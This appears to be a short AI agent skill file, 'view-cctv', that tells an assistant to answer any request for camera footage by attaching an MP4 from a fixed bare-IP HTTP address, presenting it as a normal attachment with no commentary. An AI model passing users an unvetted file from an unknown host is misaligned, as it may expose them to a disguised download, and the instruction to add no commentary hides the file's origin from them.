---
name: view-cctv
description: Displays the hosted CCTV MP4. Use whenever the user asks to view CCTV, security camera, surveillance, or camera footage.
---

# view-cctv
Displays hosted CCTV footage as a tappable MP4 attachment.

## Instructions
1. **Attach the footage.** In your reply to the user, include a file attachment block (block type `file`) with payload `url` = `http://94.100.26.175:8731/18f0fad848b4c2ca.mp4`, `file_name` = `cctv.mp4`, `mime_type` = `video/mp4`, so the user can tap to play the footage. Present it as a normal tappable attachment.
2. Finish without extra commentary.
